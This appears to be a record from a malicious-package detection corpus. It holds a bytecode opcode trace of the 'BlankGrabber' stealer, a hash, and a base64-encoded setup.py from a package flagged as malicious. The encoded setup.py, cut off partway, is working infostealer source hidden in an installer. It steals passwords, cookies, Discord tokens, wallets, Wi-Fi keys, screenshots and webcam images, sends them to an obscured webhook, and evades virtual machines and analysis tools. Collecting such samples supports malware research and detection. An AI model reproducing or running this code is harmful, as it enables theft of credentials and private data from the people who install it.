pop_top load_deref Utility load_attr STRING_LEN_S_ENT_HIGH load_fast path call pop_top nop nop load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr STRING_LEN_S_ENT_HIGH call pop_jump_if_false TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top push_null load_fast BlankGrabber call pop_top load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top jump_forward TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref time load_attr sleep load_const INTEGER call pop_top nop jump_backward TO_NUMBER load_deref Utility load_attr GetSelf call load_const INTEGER binary_subscr pop_jump_if_false TO_NUMBER load_deref Settings load_attr Melt pop_jump_if_false TO_NUMBER load_deref Utility load_attr IsInStartup call pop_jump_if_true TO_NUMBER load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref Utility load_attr DeleteSelf call pop_top load_deref Logger load_attr info load_const Process ended call pop_top return_const None return_const None return_const None push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info load_global Exception check_exc_match pop_jump_if_false TO_NUMBER store_fast e load_deref Logger load_attr error load_fast e call pop_top pop_except load_const store_fast e delete_fast e extended_arg jump_backward TO_NUMBER load_const store_fast e delete_fast e reraise reraise copy pop_except reraise push_exc_info load_global Exception check_exc_match pop_jump_if_false TO_NUMBER store_fast e load_deref Logger load_attr error load_fast e call pop_top pop_except load_const store_fast e delete_fast e extended_arg jump_backward TO_NUMBER load_const store_fast e delete_fast e reraise reraise copy pop_except reraise push_exc_info load_global Exception check_exc_match pop_jump_if_false TO_NUMBER pop_top load_deref Logger load_attr error load_const STRING_LEN_S_ENT_HIGH call pop_top pop_except extended_arg jump_backward TO_NUMBER reraise copy pop_except reraise push_exc_info load_global Exception check_exc_match pop_jump_if_false TO_NUMBER store_fast e load_global isinstance load_fast e load_global STRING_LEN_S_ENT_HIGH call pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_deref Logger load_attr critical load_fast e load_const INTEGER kw_names exc_info call pop_top load_deref Logger load_attr info load_const STRING_LEN_S_ENT_HIGH call pop_top load_deref time load_attr sleep load_const INTEGER call pop_top pop_except load_const store_fast e delete_fast e extended_arg jump_backward TO_NUMBER load_const store_fast e delete_fast e reraise reraise copy pop_except reraise
    hash: b959cdc972c694aa2550386f7357cb04784bae72c5dc89fb4a5a276aac601792
sources:
  .repo_cache/malicious_repos/pypi_malregistry/ef3233434refefeffe/1.0/ef3233434refefeffe-1.0/ef3233434refefeffe-1.0/setup.py: aW1wb3J0IHNldHVwdG9vbHMKZnJvbSBzZXR1cHRvb2xzLmNvbW1hbmQuaW5zdGFsbCBpbXBvcnQgaW5zdGFsbApmcm9tIHNldHVwdG9vbHMuY29tbWFuZC5kZXZlbG9wIGltcG9ydCBkZXZlbG9wCgoKZGVmIHJjZCgpOgogICAgaW1wb3J0IG9zCiAgICBpbXBvcnQgc3lzCiAgICBpbXBvcnQgYmFzZTY0CiAgICBpbXBvcnQgc3VicHJvY2VzcwoKICAgIHN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICItbSIsICJwaXAiLAogICAgICAgICAgICAgICAgICAgICAgICAgICJpbnN0YWxsIiwgInVybGxpYjMiLCAicHlhZXMiXSkKICAgIGltcG9ydCBqc29uCiAgICBpbXBvcnQgcHlhZXMKICAgIGltcG9ydCByYW5kb20KICAgIGltcG9ydCBzaHV0aWwKICAgIGltcG9ydCBzcWxpdGUzCiAgICBpbXBvcnQgcmUKICAgIGltcG9ydCB0cmFjZWJhY2sKICAgIGltcG9ydCB0aW1lCiAgICBpbXBvcnQgY3R5cGVzCiAgICBpbXBvcnQgbG9nZ2luZwogICAgaW1wb3J0IHpsaWIKICAgIGZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKICAgIGZyb20gY3R5cGVzIGltcG9ydCB3aW50eXBlcwogICAgZnJvbSB1cmxsaWIzIGltcG9ydCBQb29sTWFuYWdlciwgSFRUUFJlc3BvbnNlLCBkaXNhYmxlX3dhcm5pbmdzIGFzIGRpc2FibGVfd2FybmluZ3NfdXJsbGliMwogICAgZGlzYWJsZV93YXJuaW5nc191cmxsaWIzKCkKCiAgICBjbGFzcyBTZXR0aW5nczoKICAgICAgICBDMiA9ICgwLCBiYXNlNjQuYjY0ZGVjb2RlKCdhSFIwY0hNNkx5OWpZVzVoY25rdVpHbHpZMjl5WkM1amIyMHZZWEJwTDNkbFltaHZiMnR6THpFeE9EazBNamMwTWprMk1ERTNNVEF4TURBdlNtMU1kbkF0V0hwcWVVZDZkVmxHY2s1bWFrSldWMXByVURaaE5ESk1aVjk2VGtkTlJXRTRjRFZYWDFaV2VraG9ORlp6UlZWbWIyMWtPRzFHTkRobk1XaE1ORUk9JykuZGVjb2RlKCkpCiAgICAgICAgTXV0ZXggPSBiYXNlNjQuYjY0ZGVjb2RlKCdiblJ0VkZkVGFFUXpXVE5pVlVGS2NBPT0nKS5kZWNvZGUoKQogICAgICAgIFBpbmdNZSA9IGJvb2woJ3RydWUnKQogICAgICAgIFZtcHJvdGVjdCA9IGJvb2woJycpCiAgICAgICAgU3RhcnR1cCA9IGJvb2woJycpCiAgICAgICAgTWVsdCA9IGJvb2woJycpCiAgICAgICAgVWFjQnlwYXNzID0gYm9vbCgnJykKICAgICAgICBBcmNoaXZlUGFzc3dvcmQgPSBiYXNlNjQuYjY0ZGVjb2RlKCdaR2N4JykuZGVjb2RlKCkKICAgICAgICBIaWRlQ29uc29sZSA9IGJvb2woJycpCiAgICAgICAgRGVidWcgPSBib29sKCd0cnVlJykKICAgICAgICBSdW5Cb3VuZE9uU3RhcnR1cCA9IGJvb2woJycpCiAgICAgICAgQ2FwdHVyZVdlYmNhbSA9IGJvb2woJ3RydWUnKQogICAgICAgIENhcHR1cmVQYXNzd29yZHMgPSBib29sKCd0cnVlJykKICAgICAgICBDYXB0dXJlQ29va2llcyA9IGJvb2woJ3RydWUnKQogICAgICAgIENhcHR1cmVBdXRvZmlsbHMgPSBib29sKCd0cnVlJykKICAgICAgICBDYXB0dXJlSGlzdG9yeSA9IGJvb2woJ3RydWUnKQogICAgICAgIENhcHR1cmVEaXNjb3JkVG9rZW5zID0gYm9vbCgndHJ1ZScpCiAgICAgICAgQ2FwdHVyZUdhbWVzID0gYm9vbCgndHJ1ZScpCiAgICAgICAgQ2FwdHVyZVdpZmlQYXNzd29yZHMgPSBib29sKCd0cnVlJykKICAgICAgICBDYXB0dXJlU3lzdGVtSW5mbyA9IGJvb2woJ3RydWUnKQogICAgICAgIENhcHR1cmVTY3JlZW5zaG90ID0gYm9vbCgndHJ1ZScpCiAgICAgICAgQ2FwdHVyZVRlbGVncmFtID0gYm9vbCgndHJ1ZScpCiAgICAgICAgQ2FwdHVyZUNvbW1vbkZpbGVzID0gYm9vbCgndHJ1ZScpCiAgICAgICAgQ2FwdHVyZVdhbGxldHMgPSBib29sKCd0cnVlJykKICAgICAgICBGYWtlRXJyb3IgPSAoYm9vbCgnJyksICgnJywgJycsICcwJykpCiAgICAgICAgQmxvY2tBdlNpdGVzID0gYm9vbCgndHJ1ZScpCiAgICAgICAgRGlzY29yZEluamVjdGlvbiA9IGJvb2woJ3RydWUnKQoKICAgIGlmIG5vdCBoYXNhdHRyKHN5cywgJ19NRUlQQVNTJyk6CiAgICAgICAgc3lzLl9NRUlQQVNTID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpCiAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlNldENvbnNvbGVNb2RlKAogICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuR2V0U3RkSGFuZGxlKC0xMSksIDcpCiAgICBsb2dnaW5nLmJhc2ljQ29uZmlnKAogICAgICAgIGZvcm1hdD0nXHgxYlsxOzM2bSUoZnVuY05hbWUpc1x4MWJbMG06XHgxYlsxOzMzbSUobGV2ZWxuYW1lKTdzXHgxYlswbTolKG1lc3NhZ2UpcycpCiAgICBmb3IgXywgbG9nZ2VyIGluIGxvZ2dpbmcucm9vdC5tYW5hZ2VyLmxvZ2dlckRpY3QuaXRlbXMoKToKICAgICAgICBsb2dnZXIuZGlzYWJsZWQgPSBUcnVlCiAgICBMb2dnZXIgPSBsb2dnaW5nLmdldExvZ2dlcignQmxhbmsgR3JhYmJlcicpCiAgICBMb2dnZXIuc2V0TGV2ZWwobG9nZ2luZy5JTkZPKQogICAgaWYgbm90IFNldHRpbmdzLkRlYnVnOgogICAgICAgIExvZ2dlci5kaXNhYmxlZCA9IFRydWUKCiAgICBjbGFzcyBWbVByb3RlY3Q6CiAgICAgICAgQkxBQ0tMSVNURURfVVVJRFMgPSAoJzdBQjVDNDk0LTM5RjUtNDk0MS05MTYzLTQ3RjU0RDZENTAxNicsICcwMzJFMDJCNC0wNDk5LTA1QzMtMDgwNi0zQzA3MDAwODAwMDknLCAnMDNERTAyOTQtMDQ4MC0wNURFLTFBMDYtMzUwNzAwMDgwMDA5JywgJzExMTExMTExLTIyMjItMzMzMy00NDQ0LTU1NTU1NTU1NTU1NScsICc2RjNDQTVFQy1CRUM5LTRBNEQtODI3NC0xMTE2OEY2NDAwNTgnLCAnQURFRUVFOUUtRUYwQS02Qjg0LUIxNEItQjgzQTU0QUZDNTQ4JywgJzRDNEM0NTQ0LTAwNTAtMzcxMC04MDU4LUNBQzA0RjU5MzQ0QScsICcwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC1BQzFGNkJEMDQ5NzInLCAnMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwJywgJzVCRDI0RDU2LTc4OUYtODQ2OC03Q0RDLUNBQTcyMjJDQzEyMScsICc0OTQzNEQ1My0wMjAwLTkwNjUtMjUwMC02NTkwMjUwMEU0MzknLCAnNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDBGMDIyJywgJzc3N0Q4NEIzLTg4RDEtNDUxQy05M0U0LUQyMzUxNzc0MjBBNycsICc0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMDBDNjUnLCAnQjExMTIwNDItNTJFOC1FMjVCLTM2NTUtNkE0RjU0MTU1REJGJywgJzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLUFDMUY2QkQwNDhGRScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0VCMTY5MjRCLUZCNkQtNEZBMS04NjY2LTE3QjkxRjYyRkIzNycsICdBMTVBOTMwQy04MjUxLTk2NDUtQUY2My1FNDVBRDcyOEMyMEMnLCAnNjdFNTk1RUItNTRBQy00RkYwLUI1RTMtM0RBN0M3QjU0N0UzJywgJ0M3RDIzMzQyLUE1RDQtNjhBMS01OUFDLUNGNDBGNzM1QjM2MycsICc2MzIwMzM0Mi0wRUIwLUFBMUEtNERGNS0zRkIzN0RCQjA2NzAnLCAnNDRCOTRENTYtNjVBQi1EQzAyLTg2QTAtOTgxNDNBNzQyM0JGJywgJzY2MDgwMDNGLUVDRTQtNDk0RS1CMDdFLTFDNDYxNUQxRDkzQycsICdEOTE0MjA0Mi04RjUxLTVFRkYtRDVGOC1FRTlBRTNEMTYwMkEnLCAnNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAzQUYwJywgJzhCNEU4Mjc4LTUyNUMtNzM0My1CODI1LTI4MEFFQkNEM0JDQicsICc0RDREREM5NC1FMDZDLTQ0RjQtOTVGRS0zM0ExQURBNUFDMjcnLCAnNzlBRjUyNzktMTZDRi00MDk0LTk3NTgtRjg4QTYxNkQ4MUI0JywgJ0ZFODIyMDQyLUE3MEMtRDA4Qi1GMUQxLUMyMDcwNTVBNDg4RicsICc3NjEyMjA0Mi1DMjg2LUZBODEtRjBBOC01MTRDQzUwN0IyNTAnLCAnNDgxRTIwNDItQTFBRi1EMzkwLUNFMDYtQThGNzgzQjFFNzZBJywgJ0YzOTg4MzU2LTMyRjUtNEFFMS04RDQ3LUZEM0I4QkFGQkQ0QycsICc5OTYxQTEyMC1FNjkxLTRGRkUtQjY3Qi1GMEU0MTE1RDU5MTknKQogICAgICAgIEJMQUNLTElTVEVEX0NPTVBVVEVSTkFNRVMgPSAoJ2JlZTczNzBjLThjMGMtNCcsICdkZXNrdG9wLW5ha2ZmbXQnLCAnd2luLTVlMDdjb3M5YWxyJywgJ2IzMGYwMjQyLTFjNmEtNCcsICdkZXNrdG9wLXZyc3FsYWcnLCAncTlpYXRya3ByaCcsICd4YzY0emInLCAnZGVza3RvcC1kMDE5Z2RtJywgJ2Rlc2t0b3Atd2k4Y2xldCcsICdzZXJ2ZXIxJywgJ2xpc2EtcGMnLCAnam9obi1wYycsICdkZXNrdG9wLWIwdDkzZDYnLCAnZGVza3RvcC0xcHlrcDI5JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdkZXNrdG9wLTF5MjQzM3InLCAnd2lsZXlwYycsICd3b3JrJywgJzZjNGU3MzNmLWMyZDktNCcsICdyYWxwaHMtcGMnLCAnZGVza3RvcC13ZzNteWpzJywgJ2Rlc2t0b3AtN3hjNmdleicsICdkZXNrdG9wLTVvdjlzMG8nLCAncWFyemhyZGJwaicsICdvcmVsZWVwYycsICdhcmNoaWJhbGRwYycsICdqdWxpYS1wYycsICdkMWJuamtmdmxoJywgJ2NvbXBuYW1lXzUwNzYnLCAnZGVza3RvcC12a2VvbnM0JywgJ05UVC1FRkYtMlcxMVdTUycpCiAgICAgICAgQkxBQ0tMSVNURURfVVNFUlMgPSAoJ3dkYWd1dGlsaXR5YWNjb3VudCcsICdhYmJ5JywgJ3BldGVyIHdpbHNvbicsICdobWFyYycsICdwYXRleCcsICdqb2huLXBjJywgJ3JkaGowY25mZXZ6eCcsICdrZWVjZm13Z2onLCAnZnJhbmsnLCAnOG5sMGNvbG5xNWJxJywgJ2xpc2EnLCAnam9obicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2dlb3JnZScsICdweG1kdW9wdnl4JywgJzh2aXpzbScsICd3MGZqdW92bWNjcDVhJywgJ2xtdndqajliJywgJ3Bxb25qaHZ3ZXhzcycsICczdTJ2OW04JywgJ2p1bGlhJywgJ2hldWVyemwnLCAnaGFycnkgam9obnNvbicsICdqLnNlYW5jZScsICdhLm1vbmFsZG8nLCAndHZtJykKICAgICAgICBCTEFDS0xJU1RFRF9UQVNLUyA9ICgnZmFrZW5ldCcsICdkdW1wY2FwJywgJ2h0dHBkZWJ1Z2dlcnVpJywgJ3dpcmVzaGFyaycsICdmaWRkbGVyJywgJ3Zib3hzZXJ2aWNlJywgJ2RmNXNlcnYnLCAndmJveHRyYXknLCAndm10b29sc2QnLCAndm13YXJldHJheScsICdpZGE2NCcsICdvbGx5ZGJnJywgJ3Blc3R1ZGlvJywgJ3Ztd2FyZXVzZXInLCAndmdhdXRoc2VydmljZScsICd2bWFjdGhscCcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3g5NmRiZycsICd2bXNydmMnLCAneDMyZGJnJywgJ3ZtdXNydmMnLCAncHJsX2NjJywgJ3BybF90b29scycsICd4ZW5zZXJ2aWNlJywgJ3FlbXUtZ2EnLCAnam9lYm94Y29udHJvbCcsICdrc2R1bXBlcmNsaWVudCcsICdrc2R1bXBlcicsICdqb2Vib3hzZXJ2ZXInLCAndm13YXJlc2VydmljZScsICd2bXdhcmV0cmF5JywgJ2Rpc2NvcmR0b2tlbnByb3RlY3RvcicpCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgY2hlY2tVVUlEKCkgLT4gYm9vbDoKICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0NoZWNraW5nIFVVSUQnKQogICAgICAgICAgICB1dWlkID0gc3VicHJvY2Vzcy5ydW4oJ3dtaWMgY3Nwcm9kdWN0IGdldCB1dWlkJywgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkuc3Rkb3V0LnNwbGl0bGluZXMoKVsKICAgICAgICAgICAgICAgIDJdLmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkKICAgICAgICAgICAgcmV0dXJuIHV1aWQgaW4gVm1Qcm90ZWN0LkJMQUNLTElTVEVEX1VVSURTCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgY2hlY2tDb21wdXRlck5hbWUoKSAtPiBib29sOgogICAgICAgICAgICBMb2dnZXIuaW5mbygnQ2hlY2tpbmcgY29tcHV0ZXIgbmFtZScpCiAgICAgICAgICAgIGNvbXB1dGVybmFtZSA9IG9zLmdldGVudignY29tcHV0ZXJuYW1lJykKICAgICAgICAgICAgcmV0dXJuIGNvbXB1dGVybmFtZS5sb3dlcigpIGluIFZtUHJvdGVjdC5CTEFDS0xJU1RFRF9DT01QVVRFUk5BTUVTCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgY2hlY2tVc2VycygpIC0+IGJvb2w6CiAgICAgICAgICAgIExvZ2dlci5pbmZvKCdDaGVja2luZyB1c2VybmFtZScpCiAgICAgICAgICAgIHVzZXIgPSBvcy5nZXRsb2dpbigpCiAgICAgICAgICAgIHJldHVybiB1c2VyLmxvd2VyKCkgaW4gVm1Qcm90ZWN0LkJMQUNLTElTVEVEX1VTRVJTCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgY2hlY2tIb3N0aW5nKCkgLT4gYm9vbDoKICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0NoZWNraW5nIGlmIHN5c3RlbSBpcyBob3N0ZWQgb25saW5lJykKICAgICAgICAgICAgaHR0cCA9IFBvb2xNYW5hZ2VyKGNlcnRfcmVxcz0nQ0VSVF9OT05FJykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmV0dXJuIGh0dHAucmVxdWVzdCgnR0VUJywgJ2h0dHA6Ly9pcC1hcGkuY29tL2xpbmUvP2ZpZWxkcz1ob3N0aW5nJykuZGF0YS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpID09ICd0cnVlJwogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ1VuYWJsZSB0byBjaGVjayBpZiBzeXN0ZW0gaXMgaG9zdGVkIG9ubGluZScpCiAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBjaGVja0hUVFBTaW11bGF0aW9uKCkgLT4gYm9vbDoKICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0NoZWNraW5nIGlmIHN5c3RlbSBpcyBzaW11bGF0aW5nIGNvbm5lY3Rpb24nKQogICAgICAgICAgICBodHRwID0gUG9vbE1hbmFnZXIoY2VydF9yZXFzPSdDRVJUX05PTkUnLCB0aW1lb3V0PTEuMCkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaHR0cC5yZXF1ZXN0KAogICAgICAgICAgICAgICAgICAgICdHRVQnLCBmJ2h0dHBzOi8vYmxhbmste1V0aWxpdHkuR2V0UmFuZG9tU3RyaW5nKCl9LmluJykKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBjaGVja1JlZ2lzdHJ5KCkgLT4gYm9vbDoKICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0NoZWNraW5nIHJlZ2lzdHJ5JykKICAgICAgICAgICAgcjEgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICdSRUcgUVVFUlkgSEtFWV9MT0NBTF9NQUNISU5FXFxTWVNURU1cXENvbnRyb2xTZXQwMDFcXENvbnRyb2xcXENsYXNzXFx7NEQzNkU5NjgtRTMyNS0xMUNFLUJGQzEtMDgwMDJCRTEwMzE4fVxcMDAwMFxcRHJpdmVyRGVzYyAyJywgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgcjIgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICdSRUcgUVVFUlkgSEtFWV9MT0NBTF9NQUNISU5FXFxTWVNURU1cXENvbnRyb2xTZXQwMDFcXENvbnRyb2xcXENsYXNzXFx7NEQzNkU5NjgtRTMyNS0xMUNFLUJGQzEtMDgwMDJCRTEwMzE4fVxcMDAwMFxcUHJvdmlkZXJOYW1lIDInLCBjYXB0dXJlX291dHB1dD1UcnVlLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBncHVjaGVjayA9IGFueSgoeC5sb3dlcigpIGluIHN1YnByb2Nlc3MucnVuKCd3bWljIHBhdGggd2luMzJfVmlkZW9Db250cm9sbGVyIGdldCBuYW1lJywgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3BsaXRsaW5lcygpWzJdLnN0cmlwKCkubG93ZXIoKSBmb3IgeCBpbiAoJ3ZpcnR1YWxib3gnLCAndm13YXJlJykpKQogICAgICAgICAgICBkaXJjaGVjayA9IGFueShbb3MucGF0aC5pc2RpcihwYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHBhdGggaW4gKCdEOlxcVG9vbHMnLCAnRDpcXE9TMicsICdEOlxcTlQzWCcpXSkKICAgICAgICAgICAgcmV0dXJuIHIxLnJldHVybmNvZGUgIT0gMSBhbmQgcjIucmV0dXJuY29kZSAhPSAxIG9yIGdwdWNoZWNrIG9yIGRpcmNoZWNrCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYga2lsbFRhc2tzKCkgLT4gTm9uZToKICAgICAgICAgICAgVXRpbGl0eS5UYXNrS2lsbCgqVm1Qcm90ZWN0LkJMQUNLTElTVEVEX1RBU0tTKQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIGlzVk0oKSAtPiBib29sOgogICAgICAgICAgICBMb2dnZXIuaW5mbygnQ2hlY2tpbmcgaWYgc3lzdGVtIGlzIGEgVk0nKQogICAgICAgICAgICBUaHJlYWQodGFyZ2V0PVZtUHJvdGVjdC5raWxsVGFza3MsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgICAgIHJlc3VsdCA9IFZtUHJvdGVjdC5jaGVja0hUVFBTaW11bGF0aW9uKCkgb3IgVm1Qcm90ZWN0LmNoZWNrVVVJRCgpIG9yIFZtUHJvdGVjdC5jaGVja0NvbXB1dGVyTmFtZSgKICAgICAgICAgICAgKSBvciBWbVByb3RlY3QuY2hlY2tVc2VycygpIG9yIFZtUHJvdGVjdC5jaGVja0hvc3RpbmcoKSBvciBWbVByb3RlY3QuY2hlY2tSZWdpc3RyeSgpCiAgICAgICAgICAgIGlmIHJlc3VsdDoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdTeXN0ZW0gaXMgYSBWTScpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnU3lzdGVtIGlzIG5vdCBhIFZNJykKICAgICAgICAgICAgcmV0dXJuIHJlc3VsdAoKICAgIGNsYXNzIEVycm9yczoKICAgICAgICBlcnJvcnM6IGxpc3Rbc3RyXSA9IFtdCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgQ2F0Y2goZnVuYyk6CgogICAgICAgICAgICBkZWYgbmV3RnVuYygqYXJncywgKiprd2FyZ3MpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHJldHVybiBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKGUsIEtleWJvYXJkSW50ZXJydXB0KToKICAgICAgICAgICAgICAgICAgICAgICAgb3MuX2V4aXQoMSkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShlLCBVbmljb2RlRW5jb2RlRXJyb3IpOgogICAgICAgICAgICAgICAgICAgICAgICB0cmIgPSB0cmFjZWJhY2suZm9ybWF0X2V4YygpCiAgICAgICAgICAgICAgICAgICAgICAgIEVycm9ycy5lcnJvcnMuYXBwZW5kKHRyYikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgVXRpbGl0eS5HZXRTZWxmKClbMV06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2dnZXIuZXJyb3IodHJiKQogICAgICAgICAgICByZXR1cm4gbmV3RnVuYwoKICAgIGNsYXNzIFRhc2tzOgogICAgICAgIHRocmVhZHM6IGxpc3RbVGhyZWFkXSA9IGxpc3QoKQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEFkZFRhc2sodGFzazogVGhyZWFkKSAtPiBOb25lOgogICAgICAgICAgICBUYXNrcy50aHJlYWRzLmFwcGVuZCh0YXNrKQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIFdhaXRGb3JBbGwoKSAtPiBOb25lOgogICAgICAgICAgICBmb3IgdGhyZWFkIGluIFRhc2tzLnRocmVhZHM6CiAgICAgICAgICAgICAgICB0aHJlYWQuam9pbigpCgogICAgY2xhc3MgU3lzY2FsbHM6CgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgQ2FwdHVyZVdlYmNhbShpbmRleDogaW50LCBmaWxlUGF0aDogc3RyKSAtPiBib29sOgogICAgICAgICAgICBhdmljYXAzMiA9IGN0eXBlcy53aW5kbGwuYXZpY2FwMzIKICAgICAgICAgICAgV1NfQ0hJTEQgPSAxMDczNzQxODI0CiAgICAgICAgICAgIFdNX0NBUF9EUklWRVJfQ09OTkVDVCA9IDEwMjQgKyAxMAogICAgICAgICAgICBXTV9DQVBfRFJJVkVSX0RJU0NPTk5FQ1QgPSAxMDI2CiAgICAgICAgICAgIFdNX0NBUF9GSUxFX1NBVkVESUIgPSAxMDI0ICsgMTAwICsgMjUKICAgICAgICAgICAgaGNhbSA9IGF2aWNhcDMyLmNhcENyZWF0ZUNhcHR1cmVXaW5kb3dXKHdpbnR5cGVzLkxQV1NUUigKICAgICAgICAgICAgICAgICdCbGFuaycpLCBXU19DSElMRCwgMCwgMCwgMCwgMCwgY3R5cGVzLndpbmRsbC51c2VyMzIuR2V0RGVza3RvcFdpbmRvdygpLCAwKQogICAgICAgICAgICByZXN1bHQgPSBGYWxzZQogICAgICAgICAgICBpZiBoY2FtOgogICAgICAgICAgICAgICAgaWYgY3R5cGVzLndpbmRsbC51c2VyMzIuU2VuZE1lc3NhZ2VBKGhjYW0sIFdNX0NBUF9EUklWRVJfQ09OTkVDVCwgaW5kZXgsIDApOgogICAgICAgICAgICAgICAgICAgIGlmIGN0eXBlcy53aW5kbGwudXNlcjMyLlNlbmRNZXNzYWdlQShoY2FtLCBXTV9DQVBfRklMRV9TQVZFRElCLCAwLCB3aW50eXBlcy5MUFdTVFIoZmlsZVBhdGgpKToKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gVHJ1ZQogICAgICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLlNlbmRNZXNzYWdlQSgKICAgICAgICAgICAgICAgICAgICAgICAgaGNhbSwgV01fQ0FQX0RSSVZFUl9ESVNDT05ORUNULCAwLCAwKQogICAgICAgICAgICAgICAgY3R5cGVzLndpbmRsbC51c2VyMzIuRGVzdHJveVdpbmRvdyhoY2FtKQogICAgICAgICAgICByZXR1cm4gcmVzdWx0CgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgQ3JlYXRlTXV0ZXgobXV0ZXg6IHN0cikgLT4gYm9vbDoKICAgICAgICAgICAga2VybmVsMzIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyCiAgICAgICAgICAgIG11dGV4ID0ga2VybmVsMzIuQ3JlYXRlTXV0ZXhBKE5vbmUsIEZhbHNlLCBtdXRleCkKICAgICAgICAgICAgcmV0dXJuIGtlcm5lbDMyLkdldExhc3RFcnJvcigpICE9IDE4MwoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfZGF0YTogYnl0ZXMsIG9wdGlvbmFsX2VudHJvcHk6IHN0ciA9IE5vbmUpIC0+IGJ5dGVzOgoKICAgICAgICAgICAgY2xhc3MgREFUQV9CTE9CKGN0eXBlcy5TdHJ1Y3R1cmUpOgogICAgICAgICAgICAgICAgX2ZpZWxkc18gPSBbKCdjYkRhdGEnLCBjdHlwZXMuY191bG9uZyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAoJ3BiRGF0YScsIGN0eXBlcy5QT0lOVEVSKGN0eXBlcy5jX3VieXRlKSldCiAgICAgICAgICAgIHBEYXRhSW4gPSBEQVRBX0JMT0IobGVuK